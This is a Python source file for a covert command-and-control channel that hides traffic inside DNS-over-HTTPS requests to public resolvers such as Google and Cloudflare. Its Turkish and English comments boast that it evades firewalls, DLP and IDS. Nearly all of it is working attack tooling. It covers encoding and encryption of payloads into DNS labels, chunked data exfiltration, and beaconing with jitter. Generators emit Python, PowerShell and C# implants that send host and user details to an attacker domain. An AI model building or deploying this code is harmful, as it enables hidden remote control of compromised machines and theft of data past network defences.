#!/usr/bin/env python3
"""
DNS-over-HTTPS (DoH) C2 Channel
===============================
Firewall "Bu Google/Cloudflare ile konuşuyor" sanarken,
aslında C2 trafiği şifreli DNS paketlerinin içinde gizli.

DLP ve IDS sistemleri HTTPS trafiğini göremez,
DNS query isimleri içinde base64/hex encoded komutlar taşınır.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import os
import json
import base64
import hashlib
import secrets
import time
import struct
import re
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from enum import Enum
from urllib.parse import quote, unquote
import threading


class DoHProvider(Enum):
    """Supported DoH providers"""
    GOOGLE = ("https://dns.google/dns-query", "Google Public DNS")
    CLOUDFLARE = ("https://cloudflare-dns.com/dns-query", "Cloudflare DNS")
    QUAD9 = ("https://dns.quad9.net/dns-query", "Quad9 DNS")
    NEXTDNS = ("https://dns.nextdns.io/dns-query", "NextDNS")
    ADGUARD = ("https://dns.adguard.com/dns-query", "AdGuard DNS")
    
    @property
    def url(self) -> str:
        return self.value[0]
    
    @property
    def display_name(self) -> str:
        return self.value[1]


class EncodingType(Enum):
    """Data encoding methods for DNS queries"""
    BASE32 = "base32"  # DNS-safe, case insensitive
    BASE64_URL = "base64url"  # URL-safe base64
    HEX = "hex"  # Simple hex encoding
    CUSTOM = "custom"  # Custom alphabet


class RecordType(Enum):
    """DNS record types for data exfiltration"""
    TXT = 16  # Best for data, up to 255 chars per label
    A = 1  # 4 bytes per response
    AAAA = 28  # 16 bytes per response
    MX = 15  # Priority + domain
    CNAME = 5  # Domain alias
    NULL = 10  # Binary data


@dataclass
class DoHMessage:
    """Message transmitted over DoH channel"""
    message_id: str
    message_type: str  # "cmd", "response", "data", "beacon"
    payload: bytes
    sequence: int = 0
    total_chunks: int = 1
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    checksum: str = ""
    
    def __post_init__(self):
        if not self.checksum:
            self.checksum = hashlib.md5(self.payload).hexdigest()[:8]
    
    def to_dict(self) -> Dict:
        return {
            "id": self.message_id,
            "type": self.message_type,
            "payload_b64": base64.b64encode(self.payload).decode(),
            "seq": self.sequence,
            "total": self.total_chunks,
            "ts": self.timestamp,
            "checksum": self.checksum
        }


@dataclass
class DoHSession:
    """DoH C2 session state"""
    session_id: str
    client_id: str
    provider: DoHProvider
    domain: str
    encryption_key: bytes
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    last_beacon: Optional[str] = None
    messages_sent: int = 0
    messages_received: int = 0
    bytes_exfiltrated: int = 0
    active: bool = True
    
    def to_dict(self) -> Dict:
        return {
            "session_id": self.session_id,
            "client_id": self.client_id,
            "provider": self.provider.display_name,
            "domain": self.domain,
            "created_at": self.created_at,
            "last_beacon": self.last_beacon,
            "messages_sent": self.messages_sent,
            "messages_received": self.messages_received,
            "bytes_exfiltrated": self.bytes_exfiltrated,
            "active": self.active
        }


class DoHC2Channel:
    """
    DNS-over-HTTPS C2 Channel
    =========================
    Covert command and control channel using encrypted DNS traffic.
    
    How it works:
    1. Commands are encoded in DNS subdomain queries
    2. Responses come back as DNS TXT/A/AAAA records
    3. Traffic looks like legitimate DNS-over-HTTPS to Google/Cloudflare
    4. Firewall sees encrypted HTTPS to trusted DNS providers
    
    Features:
    - Multi-provider support (Google, Cloudflare, Quad9)
    - AES-256 encryption on top of HTTPS
    - Chunked data transfer for large payloads
    - Beacon mode with jitter
    - Record type rotation for stealth
    """
    
    # DNS label limits
    MAX_LABEL_LENGTH = 63  # Max chars per subdomain label
    MAX_DOMAIN_LENGTH = 253  # Total domain name limit
    MAX_TXT_LENGTH = 255  # TXT record limit
    
    # Base32 alphabet (DNS-safe)
    BASE32_ALPHABET = "abcdefghijklmnopqrstuvwxyz234567"
    
    def __init__(self, domain: str, provider: DoHProvider = DoHProvider.GOOGLE):
        self.domain = domain
        self.provider = provider
        self.encoding = EncodingType.BASE32
        self.sessions: Dict[str, DoHSession] = {}
        self.message_queue: List[DoHMessage] = []
        self._encryption_key: Optional[bytes] = None
        self._running = False
        self._beacon_thread: Optional[threading.Thread] = None
    
    def set_encryption_key(self, key: bytes):
        """Set AES encryption key"""
        if len(key) != 32:
            key = hashlib.sha256(key).digest()
        self._encryption_key = key
    
    def _encode_data(self, data: bytes) -> str:
        """Encode binary data for DNS query"""
        if self.encoding == EncodingType.BASE32:
            return base64.b32encode(data).decode().lower().rstrip('=')
        elif self.encoding == EncodingType.BASE64_URL:
            return base64.urlsafe_b64encode(data).decode().rstrip('=')
        elif self.encoding == EncodingType.HEX:
            return data.hex()
        else:
            return base64.b32encode(data).decode().lower().rstrip('=')
    
    def _decode_data(self, encoded: str) -> bytes:
        """Decode data from DNS response"""
        if self.encoding == EncodingType.BASE32:
            # Add padding
            padding = (8 - len(encoded) % 8) % 8
            encoded = encoded.upper() + '=' * padding
            return base64.b32decode(encoded)
        elif self.encoding == EncodingType.BASE64_URL:
            padding = (4 - len(encoded) % 4) % 4
            encoded = encoded + '=' * padding
            return base64.urlsafe_b64decode(encoded)
        elif self.encoding == EncodingType.HEX:
            return bytes.fromhex(encoded)
        else:
            padding = (8 - len(encoded) % 8) % 8
            return base64.b32decode(encoded.upper() + '=' * padding)
    
    def _encrypt_payload(self, data: bytes) -> bytes:
        """Encrypt payload with AES-256-GCM"""
        if not self._encryption_key:
            return data
        
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            nonce = secrets.token_bytes(12)
            aesgcm = AESGCM(self._encryption_key)
            ciphertext = aesgcm.encrypt(nonce, data, None)
            
            return nonce + ciphertext
        except ImportError:
            # Fallback: XOR with key
            return self._xor_encrypt(data)
    
    def _decrypt_payload(self, data: bytes) -> bytes:
        """Decrypt payload"""
        if not self._encryption_key:
            return data
        
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            
            nonce = data[:12]
            ciphertext = data[12:]
            
            aesgcm = AESGCM(self._encryption_key)
            return aesgcm.decrypt(nonce, ciphertext, None)
        except ImportError:
            return self._xor_encrypt(data)
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """Simple XOR encryption fallback"""
        if not self._encryption_key:
            return data
        
        key = self._encryption_key
        result = bytearray(len(data))
        for i, byte in enumerate(data):
            result[i] = byte ^ key[i % len(key)]
        return bytes(result)
    
    def _split_to_labels(self, encoded: str) -> List[str]:
        """Split encoded data into DNS labels"""
        labels = []
        for i in range(0, len(encoded), self.MAX_LABEL_LENGTH):
            labels.append(encoded[i:i + self.MAX_LABEL_LENGTH])
        return labels
    
    def build_dns_query(self, message: DoHMessage) -> str:
        """
        Build DNS query domain name with embedded data
        
        Format: <seq>.<chunk1>.<chunk2>...<chunkN>.<msgid>.<domain>
        Example: 0.aGVsbG8gd29y.bGQ.abc123.c2.evil.com
        """
        # Encrypt and encode payload
        encrypted = self._encrypt_payload(message.payload)
        encoded = self._encode_data(encrypted)
        
        # Split into labels
        labels = self._split_to_labels(encoded)
        
        # Build query domain
        # Format: seq.type.data1.data2...dataN.msgid.domain
        parts = [
            str(message.sequence),
            message.message_type[0],  # c=cmd, r=response, d=data, b=beacon
            *labels,
            message.message_id[:8]
        ]
        
        query = '.'.join(parts) + '.' + self.domain
        
        # Validate length
        if len(query) > self.MAX_DOMAIN_LENGTH:
            raise ValueError(f"Query too long: {len(query)} > {self.MAX_DOMAIN_LENGTH}")
        
        return query
    
    def parse_dns_response(self, record_type: RecordType, response: Any) -> Optional[bytes]:
        """Parse DNS response to extract data"""
        try:
            if record_type == RecordType.TXT:
                # TXT records contain base64/base32 encoded data
                if isinstance(response, str):
                    return self._decode_data(response.replace('"', ''))
                elif isinstance(response, list):
                    combined = ''.join(r.replace('"', '') for r in response)
                    return self._decode_data(combined)
            
            elif record_type == RecordType.A:
                # A records: 4 bytes packed as IP
                if isinstance(response, str):
                    parts = response.split('.')
                    return bytes(int(p) for p in parts)
            
            elif record_type == RecordType.AAAA:
                # AAAA records: 16 bytes packed as IPv6
                if isinstance(response, str):
                    # Parse IPv6 address
                    import ipaddress
                    addr = ipaddress.IPv6Address(response)
                    return addr.packed
            
            elif record_type == RecordType.NULL:
                # NULL records: raw binary
                if isinstance(response, bytes):
                    return response
                elif isinstance(response, str):
                    return base64.b64decode(response)
                    
        except Exception:
            pass
        
        return None
    
    def build_doh_request(self, query_domain: str, record_type: RecordType = RecordType.TXT) -> Dict:
        """
        Build DoH HTTP request
        
        Returns request configuration for use with requests/aiohttp
        """
        # Build DNS wire format query
        dns_query = self._build_dns_wire_query(query_domain, record_type)
        
        # DoH uses application/dns-message content type
        headers = {
            "Accept": "application/dns-message",
            "Content-Type": "application/dns-message",
            "Cache-Control": "no-cache"
        }
        
        # GET request with query in base64url
        get_params = {
            "dns": base64.urlsafe_b64encode(dns_query).decode().rstrip('=')
        }
        
        return {
            "url": self.provider.url,
            "method": "POST",  # POST is more reliable
            "headers": headers,
            "data": dns_query,
            "get_params": get_params  # Alternative: GET with dns param
        }
    
    def _build_dns_wire_query(self, domain: str, record_type: RecordType) -> bytes:
        """Build DNS query in wire format (RFC 1035)"""
        # Transaction ID
        txid = secrets.token_bytes(2)
        
        # Flags: standard query, recursion desired
        flags = struct.pack(">H", 0x0100)
        
        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
        counts = struct.pack(">HHHH", 1, 0, 0, 0)
        
        # Question section
        question = b""
        for label in domain.split('.'):
            question += bytes([len(label)]) + label.encode()
        question += b'\x00'  # Root label
        
        # Type and class
        question += struct.pack(">HH", record_type.value, 1)  # IN class
        
        return txid + flags + counts + question
    
    def parse_doh_response(self, response_data: bytes) -> List[Tuple[RecordType, Any]]:
        """Parse DoH response in wire format"""
        results = []
        
        try:
            # Skip header (12 bytes)
            offset = 12
            
            # Skip questions
            qdcount = struct.unpack(">H", response_data[4:6])[0]
            for _ in range(qdcount):
                while response_data[offset] != 0:
                    offset += response_data[offset] + 1
                offset += 5  # null + type + class
            
            # Parse answers
            ancount = struct.unpack(">H", response_data[6:8])[0]
            for _ in range(ancount):
                # Skip name (may be compressed)
                if response_data[offset] & 0xc0 == 0xc0:
                    offset += 2  # Pointer
                else:
                    while response_data[offset] != 0:
                        offset += response_data[offset] + 1
                    offset += 1
                
                # Type, class, TTL, rdlength
                rtype, rclass, ttl, rdlength = struct.unpack(
                    ">HHIH", response_data[offset:offset+10]
                )
                offset += 10
                
                # RDATA
                rdata = response_data[offset:offset+rdlength]
                offset += rdlength
                
                # Parse based on type
                record_type = RecordType(rtype) if rtype in [r.value for r in RecordType] else None
                if record_type:
                    results.append((record_type, rdata))
                    
        except Exception:
            pass
        
        return results
    
    def chunk_data(self, data: bytes, chunk_size: int = 100) -> List[DoHMessage]:
        """Split large data into chunked messages"""
        message_id = secrets.token_hex(8)
        total_chunks = (len(data) + chunk_size - 1) // chunk_size
        
        messages = []
        for i in range(total_chunks):
            chunk = data[i * chunk_size:(i + 1) * chunk_size]
            msg = DoHMessage(
                message_id=message_id,
                message_type="data",
                payload=chunk,
                sequence=i,
                total_chunks=total_chunks
            )
            messages.append(msg)
        
        return messages
    
    def create_session(self, client_id: str = None) -> DoHSession:
        """Create new DoH C2 session"""
        session_id = secrets.token_hex(16)
        client_id = client_id or secrets.token_hex(8)
        
        # Generate session encryption key
        key = secrets.token_bytes(32)
        
        session = DoHSession(
            session_id=session_id,
            client_id=client_id,
            provider=self.provider,
            domain=self.domain,
            encryption_key=key
        )
        
        self.sessions[session_id] = session
        return session
    
    def create_beacon_message(self, session: DoHSession, system_info: Dict = None) -> DoHMessage:
        """Create beacon/check-in message"""
        beacon_data = {
            "session_id": session.session_id,
            "client_id": session.client_id,
            "timestamp": datetime.now().isoformat(),
            "type": "beacon"
        }
        
        if system_info:
            beacon_data["system"] = system_info
        
        return DoHMessage(
            message_id=secrets.token_hex(8),
            message_type="beacon",
            payload=json.dumps(beacon_data).encode()
        )
    
    def create_command_message(self, command: str, args: Dict = None) -> DoHMessage:
        """Create command message"""
        cmd_data = {
            "cmd": command,
            "args": args or {},
            "timestamp": datetime.now().isoformat()
        }
        
        return DoHMessage(
            message_id=secrets.token_hex(8),
            message_type="cmd",
            payload=json.dumps(cmd_data).encode()
        )
    
    def generate_implant_code(self, session: DoHSession, language: str = "python") -> str:
        """Generate DoH C2 implant code"""
        
        if language == "python":
            return self._generate_python_implant(session)
        elif language == "powershell":
            return self._generate_powershell_implant(session)
        elif language == "csharp":
            return self._generate_csharp_implant(session)
        else:
            return self._generate_python_implant(session)
    
    def _generate_python_implant(self, session: DoHSession) -> str:
        """Generate Python DoH implant"""
        key_b64 = base64.b64encode(session.encryption_key).decode()
        
        return f'''#!/usr/bin/env python3
# DoH C2 Implant - Session: {session.session_id[:8]}
import base64, hashlib, json, secrets, time, struct
import urllib.request, urllib.parse

DOH_URL = "{self.provider.url}"
DOMAIN = "{self.domain}"
SESSION_ID = "{session.session_id}"
KEY = base64.b64decode("{key_b64}")
BEACON_INTERVAL = 30
JITTER = 10

def xor_crypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def encode_data(data):
    encrypted = xor_crypt(data, KEY)
    return base64.b32encode(encrypted).decode().lower().rstrip('=')

def decode_data(encoded):
    padding = (8 - len(encoded) % 8) % 8
    decoded = base64.b32decode(encoded.upper() + '=' * padding)
    return xor_crypt(decoded, KEY)

def build_dns_query(domain, qtype=16):
    txid = secrets.token_bytes(2)
    flags = struct.pack(">H", 0x0100)
    counts = struct.pack(">HHHH", 1, 0, 0, 0)
    question = b""
    for label in domain.split('.'):
        question += bytes([len(label)]) + label.encode()
    question += b'\\x00' + struct.pack(">HH", qtype, 1)
    return txid + flags + counts + question

def send_doh(query_domain):
    dns_query = build_dns_query(query_domain)
    req = urllib.request.Request(
        DOH_URL,
        data=dns_query,
        headers={{"Content-Type": "application/dns-message", "Accept": "application/dns-message"}}
    )
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read()
    except:
        return None

def beacon():
    import platform, os
    info = {{"h": platform.node(), "u": os.getenv("USER", "?"), "os": platform.system()}}
    data = json.dumps({{"t": "b", "s": SESSION_ID[:8], "i": info}}).encode()
    encoded = encode_data(data)
    labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    query = ".".join(["b"] + labels + [SESSION_ID[:8], DOMAIN])
    return send_doh(query)

def exfil_data(data):
    chunks = [data[i:i+100] for i in range(0, len(data), 100)]
    for i, chunk in enumerate(chunks):
        encoded = encode_data(chunk)
        labels = [encoded[j:j+60] for j in range(0, len(encoded), 60)]
        query = ".".join([str(i), "d"] + labels + [SESSION_ID[:8], DOMAIN])
        send_doh(query)
        time.sleep(0.5)

def main():
    while True:
        try:
            response = beacon()
            # Parse response for commands...
            time.sleep(BEACON_INTERVAL + secrets.randbelow(JITTER))
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
'''
    
    def _generate_powershell_implant(self, session: DoHSession) -> str:
        """Generate PowerShell DoH implant"""
        key_b64 = base64.b64encode(session.encryption_key).decode()
        
        return f'''# DoH C2 Implant - PowerShell
$DOH_URL = "{self.provider.url}"
$DOMAIN = "{self.domain}"
$SESSION_ID = "{session.session_id}"
$KEY = [Convert]::FromBase64String("{key_b64}")

function XOR-Crypt($data, $key) {{
    $result = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {{
        $result[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }}
    return $result
}}

function Encode-Data($data) {{
    $encrypted = XOR-Crypt $data $KEY
    $encoded = [Convert]::ToBase32String($encrypted).ToLower().TrimEnd('=')
    return $encoded
}}

function Build-DNSQuery($domain, $qtype = 16) {{
    $txid = [byte[]]::new(2)
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($txid)
    $flags = [BitConverter]::GetBytes([UInt16]0x0100)
    [Array]::Reverse($flags)
    $counts = [byte[]](0,1,0,0,0,0,0,0)
    
    $question = @()
    foreach ($label in $domain.Split('.')) {{
        $question += [byte]$label.Length
        $question += [System.Text.Encoding]::ASCII.GetBytes($label)
    }}
    $question += 0
    $typeBytes = [BitConverter]::GetBytes([UInt16]$qtype)
    [Array]::Reverse($typeBytes)
    $classBytes = [BitConverter]::GetBytes([UInt16]1)
    [Array]::Reverse($classBytes)
    $question += $typeBytes + $classBytes
    
    return $txid + $flags + $counts + $question
}}

function Send-DoH($queryDomain) {{
    $dnsQuery = Build-DNSQuery $queryDomain
    $headers = @{{
        "Content-Type" = "application/dns-message"
        "Accept" = "application/dns-message"
    }}
    try {{
        $response = Invoke-WebRequest -Uri $DOH_URL -Method POST -Body $dnsQuery -Headers $headers -TimeoutSec 10
        return $response.Content
    }} catch {{
        return $null
    }}
}}

function Beacon {{
    $info = @{{
        h = $env:COMPUTERNAME
        u = $env:USERNAME
        os = "Windows"
    }}
    $data = @{{t = "b"; s = $SESSION_ID.Substring(0,8); i = $info}} | ConvertTo-Json -Compress
    $encoded = Encode-Data ([System.Text.Encoding]::UTF8.GetBytes($data))
    $query = "b.$encoded.$($SESSION_ID.Substring(0,8)).$DOMAIN"
    return Send-DoH $query
}}

while ($true) {{
    try {{
        $response = Beacon
        Start-Sleep -Seconds (30 + (Get-Random -Maximum 10))
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
    
    def _generate_csharp_implant(self, session: DoHSession) -> str:
        """Generate C# DoH implant"""
        key_b64 = base64.b64encode(session.encryption_key).decode()
        
        return f'''// DoH C2 Implant - C#
using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class DoHImplant
{{
    const string DOH_URL = "{self.provider.url}";
    const string DOMAIN = "{self.domain}";
    const string SESSION_ID = "{session.session_id}";
    static readonly byte[] KEY = Convert.FromBase64String("{key_b64}");
    
    static byte[] XorCrypt(byte[] data, byte[] key)
    {{
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        return result;
    }}
    
    static string EncodeData(byte[] data)
    {{
        byte[] encrypted = XorCrypt(data, KEY);
        return Convert.ToBase64String(encrypted)
            .Replace('+', '-').Replace('/', '_').TrimEnd('=');
    }}
    
    static async Task<byte[]> SendDoH(string queryDomain)
    {{
        using var client = new HttpClient();
        byte[] dnsQuery = BuildDnsQuery(queryDomain);
        
        var content = new ByteArrayContent(dnsQuery);
        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/dns-message");
        client.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/dns-message"));
        
        var response = await client.PostAsync(DOH_URL, content);
        return await response.Content.ReadAsByteArrayAsync();
    }}
    
    static byte[] BuildDnsQuery(string domain)
    {{
        // Simplified DNS query builder
        var rng = new Random();
        byte[] txid = new byte[2];
        rng.NextBytes(txid);
        
        var query = new System.Collections.Generic.List<byte>();
        query.AddRange(txid);
        query.AddRange(new byte[] {{ 0x01, 0x00 }}); // Flags
        query.AddRange(new byte[] {{ 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }}); // Counts
        
        foreach (var label in domain.Split('.'))
        {{
            query.Add((byte)label.Length);
            query.AddRange(Encoding.ASCII.GetBytes(label));
        }}
        query.Add(0); // Root
        query.AddRange(new byte[] {{ 0x00, 0x10, 0x00, 0x01 }}); // TXT, IN
        
        return query.ToArray();
    }}
    
    static async Task Beacon()
    {{
        var info = new {{ h = Environment.MachineName, u = Environment.UserName, os = "Windows" }};
        var data = JsonSerializer.Serialize(new {{ t = "b", s = SESSION_ID.Substring(0, 8), i = info }});
        string encoded = EncodeData(Encoding.UTF8.GetBytes(data));
        string query = $"b.{{encoded}}.{{SESSION_ID.Substring(0, 8)}}.{{DOMAIN}}";
        await SendDoH(query);
    }}
    
    static async Task Main()
    {{
        var rng = new Random();
        while (true)
        {{
            try
            {{
                await Beacon();
                await Task.Delay((30 + rng.Next(10)) * 1000);
            }}
            catch
            {{
                await Task.Delay(60000);
            }}
        }}
    }}
}}
'''
    
    def get_statistics(self) -> Dict:
        """Get DoH C2 channel statistics"""
        active_sessions = sum(1 for s in self.sessions.values() if s.active)
        total_bytes = sum(s.bytes_exfiltrated for s in self.sessions.values())
        
        return {
            "provider": self.provider.display_name,
            "domain": self.domain,
            "encoding": self.encoding.value,
            "total_sessions": len(self.sessions),
            "active_sessions": active_sessions,
            "total_bytes_exfiltrated": total_bytes,
            "messages_in_queue": len(self.message_queue)
        }


# Singleton instance
_doh_channel = None

def get_doh_channel(domain: str = "c2.example.com", 
                    provider: DoHProvider = DoHProvider.GOOGLE) -> DoHC2Channel:
    """Get DoH C2 channel instance"""
    global _doh_channel
    if _doh_channel is None or _doh_channel.domain != domain:
        _doh_channel = DoHC2Channel(domain, provider)
    return _doh_channel


def demo():
    """Demonstrate DoH C2 capabilities"""
    print("=" * 60)
    print("DNS-over-HTTPS (DoH) C2 Channel")
    print("=" * 60)
    
    print("\n[*] Supported DoH Providers:")
    for provider in DoHProvider:
        print(f"    - {provider.display_name}: {provider.url}")
    
    channel = get_doh_channel("c2.example.com", DoHProvider.GOOGLE)
    
    print(f"\n[*] Channel Configuration:")
    print(f"    Domain: {channel.domain}")
    print(f"    Provider: {channel.provider.display_name}")
    print(f"    Encoding: {channel.encoding.value}")
    
    # Create session
    session = channel.create_session("test-client")
    print(f"\n[*] Session Created:")
    print(f"    Session ID: {session.session_id}")
    print(f"    Client ID: {session.client_id}")
    
    # Create beacon message
    beacon = channel.create_beacon_message(session, {"hostname": "WORKSTATION01"})
    query = channel.build_dns_query(beacon)
    print(f"\n[*] Beacon Query Example:")
    print(f"    {query[:80]}...")
    
    print("\n[*] How it appears to firewall:")
    print(f"    → HTTPS connection to {channel.provider.url}")
    print("    → Content-Type: application/dns-message")
    print("    → Looks like legitimate DNS resolution")
    
    print("\n[*] Python implant preview:")
    print("-" * 40)
    implant = channel.generate_implant_code(session, "python")
    print(implant[:800] + "...")
    
    print("\n[*] Ready for covert C2 operations")
    print("-" * 60)


if __name__ == "__main__":
    demo()
